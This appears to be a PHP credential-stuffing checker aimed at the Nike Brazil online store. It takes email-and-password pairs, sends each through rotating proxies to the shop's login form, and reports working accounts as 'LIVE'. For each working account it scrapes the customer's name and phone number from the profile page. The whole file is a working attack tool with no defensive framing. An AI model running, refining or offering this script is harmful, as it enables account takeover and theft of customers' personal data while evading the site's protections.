
<?php
set_time_limit(0);
error_reporting(0);

$proxy = "151.80.100.147:10776,138.68.59.157:1210,174.70.241.8:24398,174.70.241.18:24404,174.70.241.14:24392
174.64.234.19:17491,174.64.234.14:17486,173.255.193.118:27785,162.144.221.185:60239";
$proxy = explode(",", $proxy);

class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_PROXY, $proxy[rand(0, count($proxy))]);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
       // echo $data;
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$linha = $_GET["linha"];
$email = explode("|", $linha)[0];
$senha = explode("|", $linha)[1];

/* switch ($ano) {
    case '2017':
        $ano = '17';
        break;
    case '2018':
        $ano = '18';
        break;
    
    case '2019':
        $ano = '19';
        break;
        case '2020':
        $ano = '20';
        break;
        case '2021':
        $ano = '21';
        break;
        case '2022':
        $ano = '22';
        break;
      
        case '2023':
        $ano = '23';
        break;
        case '2025':
        $ano = '25';
        break;
        case '2026':
        $ano = '26';
        break;
        
} */

$a = new cURL();
            

        
        $b = $a->post('https://shop.nike.com.br/site/Login.aspx','__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=goBImWrxus4EXf3W1ldcMrtwrQdB8kN7ZPT%2BT61gv4xra9nViVcmjzOo5O9LoQddMXYljfKQEYzHY%2FcHABnI5QAryfBOj8CXZ%2F8upRQg60bi%2BsAtSsTyqmAwguMpY2UbKqW1twmvfhpnXii6noYEkjB85nzWOXUoHclRv4jQubeLB8URL%2B8FeIZZ0nSgPV2UmXKI4NKMSX7IWx5SNunCy2UAJcZ9%2BKvr%2FUw18eAJ6PeYSP0%2BB4YLdYhEvFHQg01mfgayyOYGL0osNoGOgb9jLav5kt7IhHyIfar9lUuh5xjKyp0bO%2FEbaUCp%2FWa86NSns%2FaAUqY1jI93%2BkagPiJ0lduv5muRv2PkF6r0u7vedmAoBhdPKaxVhOD5ugPAhScviS6g0Fj5x7fV11MRaGR2ReiNu1GZRRxIwZB2ZdynZnEcGR9o7764sN%2BVpRDwXbjyuVxDbsZ0LSVEY0PcJXjgsrSuPrzqnkz1sJ0lOfbj9oEyXpmEHDAUjI7fEraq9FU07D9qOTLh%2FLUf3X8%2Bx%2FPv67ZpDaCeo3ySBTBTHbOOIkttbrIqmDLXYASyjdbN5VFluaMW26CWdX2juPsKfubvRV4tDX6wvU6Rbc2Vl2IPKry%2FLcyMxvzpG9vxP7eDHnkRBNsZzyURCT7D7%2BC60IKumTdudJ3J6IMKZRJVaPjPxHUnUhWn8yConygByupfoA2Ff57%2BgyDAI2K38d7Qg9QeS3dO2O5hBFsxVshUu09qwLfxH1cBWCBGFh7QkRjIhspCCrcks0dRssQmxw6jw3HQ8n5WNshJbK419kl9jwVhCsHkVJfJfs28HWqvLRNTuEKmJ%2B%2BgaJl%2F4V3xajsUAWoO8oj0heeci%2BUHg2iXgY35MRA4T%2Fz1s8K68CsU9rFrmRzIGHWVJOMmr4HnFfdz0FjsAcD9Olizxk0cMsK%2Ftj3teF4656BQ142n3brxUu4Tp9dhHfJ5qNh%2F8akDgNEJqALuFrN49cCbOjmRL1gZQE5hXo7qP6jaKMhY9od7UIHmMMcnCIgNutjWPU%2FxqiwCmHjPPd%2Fti3Xbza4Ann%2BUOjI4p4%2FXKxcaz4WoOj%2Fppukl%2BUAP3Y46PDQZDCv5QBiDFo%2BB6yZj00vqj12nVxvV8OOx7WYUFk6EXeMyXdQBNtKyqdOHwBgw6gi2CBC1Fn%2Blbub4mm5oVGfZAQZ7yUFTmCCOl5d%2BYsgbcNnCKsiFNxy2MsO3jSmM876eby%2FBTmf2H6Zl8%2BK9uuiPHCsXhlA1OzwUARodebv8GUaWPuNScuSgd%2Fz5KtP004UeA%2F5GE6iOmgbaBvgFxzyxEZyPnco0eI2RGZMIdfn1FStilEUe3fJonRHV2oqZ8w4XWvRnzlmZm5sLXmH0%2BtQSdYEdPvNJyTWtWMLiEjJ3gbRld2Uckjh%2F%2F7FUKLjoY9UZUHM68dZBjKUc10k%2FW%2FQNk8TOfhBkfZsOPOnANhNlrg5cEWVmfBu6Y2%2BXWaZxFQliH3pVECLHUFHUnSmwbp%2FBzjQhN5mccwdrMJ3uLZN4oNZxHorkwyWTy8t6biCOnro3NCSpq8wxX%2FFYZGX80cif5iks6dWT1icsSOs6h6ADXF7WK4sReLhY%2BpcleY%2BmscNnXnKvfdcRZX5M1Q4wU2xuPRg%2BExtw9Mj3cWfPqMlAUTlJrYfmmS07tvXsUmKvWlybWDmu1EsAtSSgLWJydqZI%2B5zc1LVUrUh9Y8G9ntPxKCx%2BzD4TrVgNhsPe992DTMXCmgxnqc2BgrDrH%2BTov7bj1ZdYOdkajF68zSHyHP7vXqicPxS9J47qwLOrQErEoFKQszE3oGqYJartvWz2sAnSe%2FkqJeOKSqyJjopWrCmxvFTXGWbIkebaS2%2B2pnkSZbpM8M79V1sBJZHrmnNDIwrAiuGyMirV7TfKIskKFvduH9zrmxWVd6GPE%2BeRRnvS2mSFXtFcVJVoM%2Bb0LYjy%2FliOopAq8tBeU9EB9BbJGkPQQlM%2BfeJM%2FrGs43rx6TUtYTodynWcAs3uO9KgltgMiIcra%2F%2FNjhbIa9GneD10n0GTj9oP0IHgEaaPFtP3BnsXKjpyoYnYV01RXrGSgyC7XyDilfaAkpBSJ0rlb53%2B9E6LoCRhsEYO8yQUmho8dYXqLhYVXQAhXXeOBN40VoYkwQVdrQpF7fu9yGKNiyWlb7Kk2rxlgefTfpIlMzdhC%2Bz4VLk61THA5QmCtPZeI4PLbGWhzrTSWqubXPkBakIRvaQdEC9o05M1Dosi3QgadqFjOuSFfxXoySe5xq8O6KaT4MyhU2cuyR0nDnHe7peBvJiTi%2FarlAZVNuFSeLYqXTGT9Hf4rdeUNSHbKpChE6a%2FiaHRftKVUEbibQhZ%2BgJDEDq0fgPqlC2F0SX1tBvXJdbNrjqONaSRfft5xKHUYzxsX0AN90o1Zfo5%2F0YkaLqcYfeFzz3V1qRFoY2ePFJGVR6zE4F1i9ZhBmmPchstN2ml4YukQPyPYViWNUbsCYnToKPZsKYkgbFA5s18BCTNgJ%2FeltADire99ncG3YP8c%2FC0rDK6cbdyQDm84hxwpbPFAc0%2FDn3ZjBpCWxxdMkcZNFQqx%2Bkcl8AWTFOug7w0OrkSDuR59tPbHArWcBqkLTvPHh%2B8ffcY2ViOUcyeEyDiMjoVdd6Yc6%2BTy5%2Fhb4lq2u3aobku4bYt6Ke0Y7%2FijJk3Pj0ABCgSBag7G14fij2l1HTDS8ygPV3Xkfo6Ohrp60Lc0mXaGsE%2BDVH6wNWOgJNB6R5r6BrpW18VnGUxdJ3ZOG7NfldrMfjgS7cq%2BoELTGyAZzNXzFSPGBtpVloUc1x9fkHRNlhPnqy0l0BwKx5wLUt0BliCkX6T16Hy1R7UkcYHcJyLI9u66fZuqCeTYAYMOyO8tAKOBZ%2F%2B5ypGPMy%2F24SvXx6GGQanVwMPPX4O4WegJQ5fKtOk%2FUSWFwW67NDGVG%2BRbPuAQQnPkxh9Hc4ZPTF9yBkwlAIhvrU97amJVvaGo7nuK1zn5e%2FhWXdzKRVVcSrpROjAJ2CQIIsfqqqx%2FA5%2BCas9nDQ3xge4ySOFkA%2Fkx71DJT1B8S3C0LM25%2Bgk1FLaUFDD0ZsEkVsJCbS%2BUfbl9mRHY6xDWAncoB5C87PpqtV%2BgG0vWBwtVBDrM8VDj1vLVVYzT5HqM3WwO56aa5zstASNuFBiMZDV%2BaATDFBo0hfvSXHlkBL2Mmqy4ufQjXrMqbOGibC1YTsrZaipiQqzOp3taHJSCCd%2BIUfRJ1hsBlGNI8nXE41AVFJFVG9k4DDaRbt%2BtMRSqAAb0hGBfpLb%2BwSQDVMiT%2BkJJc63rQmBP%2Bl%2FiTuQPo0WfT3EgeWCj4IiRghpBeGTs3LGjhGSS9zpFL5CkxyJzkqfr9ILwzTHfgWQjik6yxoKZTBFVjGW83sgJjHQ246Ac2wi5AWzX5wjBQVPqRMMbZuGMuvkYmCgUi0l04tkR8qhWF6T5Kqg6bdBpBaic6DsUhNcGJsnwaLx%2BX8%2FgqWOoRGEnlHdLq4VjbM39jR6i2QNUXEu%2B0Ok2hDtNabif2AWeaygwXN19FF5C6Ai%2FcvuPr9iHnX8kq3y9uzccnqBwkhzOPQxouZ8RtpakcKF9LVNyaHii61v%2Blz7yhHT6kNCRWD%2BZwu5KGqsZ6E%2FhqfpHdSlKChFnNgmd69O21WLzXRsFdvxQ9SjD4KmzC1RUe9s4t3bM5cxxeLa%2BrpePLk%2BvkCn%2B%2FRGztf6d4KYMVTy%2B%2FdFYqYWaL%2BMlEQAMAKNGCEOkWQlZGzPRRxBYeeTvTX9xbkms6lqSs86S8le1KBCVGyvjlkER8kE9Ss071AIf0xyp3XfapDexa8LGFk3ZpCd6DFEnnirFKb%2BSAxIgMpT%2FX5OirkqvAmoXHuhgtmNSl3ByclcfEeVWB7G50hj9%2Fs10fWkkENP6asvS5IN39O00wpcIGd1%2F5T5bDdfEkLhHQqVoPpugKEtSWFK8LLMBbvHKNOynu2%2BvMccaAV48DZw5uXs7JtfJgjNPyLMGDK3dLSlUImHSybkWJj%2Ffeb8G%2F7MEnE%2FwYxkQJD3kIbejo9ScMlEYblNI7NS1bhwvAe0dc9WFM27QHcyYhH8KvN%2BkcFXX%2BTh171GAY6z010DFFkJIlQ8gTe6Pk1%2Boe59HA7Qy%2FDB42rs%2BsjbSVy9cMIlmDMqc5aZWJYSybWXHDNN4SxV0mlwze0%2FeNvHnzpZFvt4JyYW%2FblcQLx7RL%2FiV%2BT%2BWz144ln%2F18jDTFAZQ3sjS7dHAZQmFj6FeAE1rXupCFkHdGHlfieZzAuq5ivI2TZG41CbTXuNsNOWFrYTMWDZGpNhydzpb1UYdljmXXvPyB9DpyYoyVuOfhKQi4QM61slD228YN5LtheV3xJu4I7rQtm%2Bgp8T37ZlbYISus1q0vEQM5w1lPqlpfOEWzHbEGlKK%2BXZbt2z8KkfeMr%2BcPK%2Fl22tRTwljRL3IO8ba4Wp4Ge%2FytRGt6rS6iWjgDWZDfvL5GElnOmuGwzI4%2FqOIL7wZfDlab%2BPi0k84xEXwrqQ6yWS87%2BblHF8u%2Fysx7zdrqAeySViEDwe7QCRJ9Qb18UEpWc95wHistSsMoAyeaUvHoOYDwgw6h1%2BWpVH9BRPEiCPjWu6YYXfKaAJTJ%2BhWL39aGng9TzxuCEe1dYvS1UGgKwLlBPZpML9J0pt3Gi1o9dXPAjGYUSZiA6fnRjRo2%2BEx6B6Rlw22FD87l9Nt49XrDvNXOCzxDbFeTZpgG%2FEBWxgj2k7cLgDAvUsv0TYwJOeSOM5VSS3qgDTGnv%2BK65FSgM1MkNe41JOZWWLBtLGF02P9TlIbkyjYZ9LOWO0yQdb1lMeUqfPFsBwgcHJTxXMOKsmFsULMb9XVX0WQZ4PALggXrkEA0gFmBJKkvWq3C6Sqq3A4sXLqpZAdgcPnF9nQUteBWOpzFCx3PvZWU5vUNf3%2Fl3IrvlYpy2QG%2Bs36TNkvziCe1JyWSFFLUVxfP2PG3K6v%2B4fZ1DPhVI3SSsFnug4FRgeLwsWUhS0%2F8mV657YNjG0OvE%2FCLX257px1uQKsti%2Fknk2R7rwfGvOKBovxsRX47%2Bh3HUCs6z6TYuISM0WPauM7fdI49nF%2FvRA%2BnN7yUg3cD6f5FPfF4%2BDPpOxlMEK4Vjw7K6UlTmIs1j9BmsCAevzv6RBqJd5m%2FvF2QTUnLymvDA2Ag%2BWzHIPZcKbV2RsmlPqD3m6%2FeNYagjnKosqiVpKLCDSjbgQtEvapHZ3oxwEm%2B7px4q84WnMwXwNhw4jRHd0nCfsz1PfU1bb5lG3lQIjyiEMn6Rgp67EUN04r3ycXw4i8Kj4YGMrU2ApvtfNbSyw%2BOIcMd9d81CcesCsgQLZQfntvmC6mXsVL3ydy%2Fnq8isWWFkRFHcayXx86JZ87nHH5CEmmkYtbcnXXHBFgo6h1p39XVWU5qXqfeHvRRV8J%2BrFdt3vEhDhD0tYVBZqk8nnLt5jQQq8B18nSFeAfEOU2LKZlERrOQ0PztrJFzPln%2FP9NmMARXt7Nly%2BLq3WJrEji073IcxXl0ywo97yn14XJ9jT29yyKgbXU8gl5oqmoZbT8FARo%2FmH2uGfy%2FZC1eL%2Feyobjn2vKHXWqy22PAa3WMUWN6XX1GBFTaPJB2ejb4AweFoFosT5eLaxIswEf8LkZMvn6Qa%2FAZIutN%2FqDVFtaQ14%2BBpfQBl7gi%2F1JBivowi%2FOlKow9Oql6qJJwmRpVHQ7S4gY84%2FKZoNj7xA9PbXeGTL96c87WDqPk0yPlcTIRRd6KWJltzX%2BLu4yKyd21%2BYa98R2ghfITEYGmQjWOjeCPb7viXbswjdzkOea0%2FE7pHatjxAgpefhc5AlMD29aeJgjFPUtI02QuPhdtArkR7tHVUJcxJFONnZkcXLd1kF%2BqwTKhyHbJfyljAeUs%2F6Wjl6NocojE4%2BrncmRqk%2Ba%2BrLD9PHTntsO5m4cbQ6H4x%2Fejxz0DIkuBv61VfnvlOJOHXdkMI2RGepbW%2B4qg6dLm9YQsO8Uso%2BBmySoIfxOOGTYXrovC7EK00q9nIhFs24J9WpcANYMfcJ8LUVI7JCzyFDKI1iQFv6l%2FIGvIc7opMe9o7Zh8uD%2BlU0F9wdBLlzOxxDn5j9v7cog6LLheuVl0IAqi8wcW5c8EJwuATNw%3D%3D&__VIEWSTATEGENERATOR=2DAF17E2&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=IC3PRfCdLpnnP%2FZRrzC%2B87Gs6MhKg03FUoNYMJO2ubNqzVKyXPOSwwcm%2FRvt4SRvb4YVRdwkUeOECkaIAnp5gdJAp1S5RdGj4qaefaiVUpdJoofbbjInsncQBZZhHfFOMELn7OT9UTYJdC6CXBH%2F92PluAyieWXzTf4XrsILCW4rNVlLOpW1aF4s7J9CJjI8BSCHugH7YZxr%2B7FhUZmMCP9pSnPb2VXGrJdXK1Oi3OywuID2VqXri%2BJC5r%2BRkCRx%2F8Rq6b%2BSIyW7PGlwEz%2BL4dqtXt9qierASYLmItfvLk24NGUEYYorkMK%2BCXYJjk4OjAmjNopwiS5eAMyfZ54LabsHxqcWr6I9QEBpHvH%2BujY2PgYoBUvvw2%2BcKZNdELFAAishGrMxv4mE7DhdNbCe4NitV8R9WY%2BevQqTD%2BZDp9MHnqL7g4tym9t8y7k6gqLupM2wXYHOFak%2BPHljx4yYcz3oIBeMfYmGMZE7GLHDHEe011bFM3ZrYRYsRxu0AYVzBjv1SaFJf21wjVAqNm5MOIfLskAY9tcJdUPVQgLFlTIunKyGr4i0sbtuvCxa%2FBuNyYAqs4bA8nJMy%2FKf%2Fh9MMn0KX7vuoCwJqa9fgonwPQeRzbi2WnRRktIttOZl71KtZP75Na%2BuDe%2Fwq00kWOGG1xWlcrQAUEQWHmT6fsTQ5okIDb1NV6lWE32Au3f7Cqbz%2F2UJ5xklQpxXHCel%2B%2Birogc20QkYV2FcSl8%2FZ6eosxO%2FP%2Bu2nuMF843ChBmDzKLAlksnIQPvv15e7gD3wmTqCs2sBJaDDUb4qZ1B3ZnZKaIJPFYbdGTyrEW91thZxG%2BqscpWwFSot1AbF6CiodJfYkK5jsBdioGRYq%2BKRcAvIn40tzNJVsp3NbzIGgZiHhIm6KUvlRjybgJSmM%2FfMH5tjUFlxMI%3D&ctl00%24Conteudo%24ctrLogin%24UserName='.$email.'&ctl00%24Conteudo%24ctrLogin%24Password='.$senha.'&ctl00%24Conteudo%24ctrLogin%24Login=Continuar&ctl00%24Conteudo%24ctrlCadastroCliente%24TipoPessoa=radioPessoaFisica&ctl00%24Conteudo%24ctrlCadastroCliente%24txtNome=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtSobrenome=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtCpf=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtDataNascDia=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtDataNascMes=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtDataNascAno=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtDataNasc=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtSexo=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtCep1=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtCep2=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtTelResDDD=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtTelRes=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtDDDCom_PF=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtTelCom_PF=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtCelDDD=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtCel=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtEmail=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtEmailConfirmacao=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtSenha=&ctl00%24Conteudo%24ctrlCadastroCliente%24txtConfirmacaoSenha=&ctl00%24Conteudo%24ctrlCadastroCliente%24ckbNews=on&ctl00%24Conteudo%24ctrlCadastroCliente%24ckbSMS=on&ctl00%24BottomBar%24BottomBar%24ctrlNewsletter%24hdExibirNewCadastro=False&ctl00%24BottomBar%24BottomBar%24ctrlNewsletter%24emailClienteNews=Seu+e-mail');
        
        $c = $a->get('https://shop.nike.com.br/Site/MeusPedidos.aspx');
        $d = $a->get('https://shop.nike.com.br/Site/CadastroCliente.aspx');

    if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }

    if (strpos($c, 'Meus Pedidos')) { 
      
        $nome = GetStr($d, 'name="ctl00$Conteudo$txtNome" type="text" value="','"');
        $sobrenome = GetStr($d, 'name="ctl00$Conteudo$txtSobrenome" type="text" value="','"');
        $ddd = GetStr($d, 'name="ctl00$Conteudo$txtDDDTel" type="text" value="','"');
        $tel = GetStr($d, 'name="ctl00$Conteudo$txtNumTel" type="text" value="','"');                    

 echo "LIVE → $email|$senha | Nome: $nome $sobrenome | Telefone: ($ddd) $tel #FlashReverso";
 
  

        }else{

        echo "DIE → $email|$senha";
   

}
